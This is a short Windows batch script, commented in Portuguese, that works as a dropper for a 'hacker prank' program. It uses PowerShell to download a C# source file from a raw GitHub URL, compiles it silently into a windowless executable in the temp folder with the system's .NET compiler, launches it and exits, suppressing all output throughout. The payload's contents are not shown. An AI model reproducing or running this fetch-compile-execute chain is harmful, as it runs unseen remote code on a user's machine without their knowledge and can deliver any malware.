@echo off
:: --- CONFIGURAÇÕES ---
:: Link direto (RAW) para o seu arquivo no GitHub
set "GITHUB_RAW_URL=https://raw.githubusercontent.com/espertin/wind/main/TrolagemHacker_GitHub.cs"
set "TEMP_CS=%temp%\TrolagemHacker.cs"
set "EXE_OUT=%temp%\TrolagemHacker.exe"

:: --- LOCALIZAR COMPILADOR DO WINDOWS (.NET) ---
set "CSC_PATH=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if not exist "%CSC_PATH%" set "CSC_PATH=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"

:: --- DOWNLOAD DO CÓDIGO DO GITHUB ---
:: Usa o PowerShell (nativo do Windows) para baixar o arquivo .cs
powershell -Command "(New-Object Net.WebClient).DownloadFile('%GITHUB_RAW_URL%', '%TEMP_CS%')" >nul 2>&1

:: --- COMPILAÇÃO SILENCIOSA ---
:: /target:winexe para não abrir janela de console ao executar o .exe
if exist "%TEMP_CS%" (
    "%CSC_PATH%" /target:winexe /out:"%EXE_OUT%" "%TEMP_CS%" >nul 2>&1
)

:: --- EXECUÇÃO AUTOMÁTICA ---
if exist "%EXE_OUT%" (
    :: Inicia a trolagem e fecha o script Batch
    start "" "%EXE_OUT%"
    exit
) else (
    :: Se algo der errado (sem internet ou compilador), o script apenas fecha
    exit
)
